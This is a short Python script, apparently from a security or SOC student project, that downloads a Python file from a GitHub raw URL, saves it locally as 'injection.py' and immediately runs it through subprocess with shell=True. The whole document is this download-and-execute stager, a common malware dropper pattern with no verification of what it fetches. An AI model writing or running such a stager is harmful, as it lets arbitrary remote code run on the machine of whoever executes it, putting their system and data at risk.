import requests
import subprocess

url = 'https://raw.githubusercontent.com/LifeIsACage/soc_project/main/py_to_download.py'
req = requests.get(url)

with open('Client development\\injection.py', 'w') as f:
    f.write(req.text)
    f.close()
subprocess.call('Client development\\injection.py', shell=True)
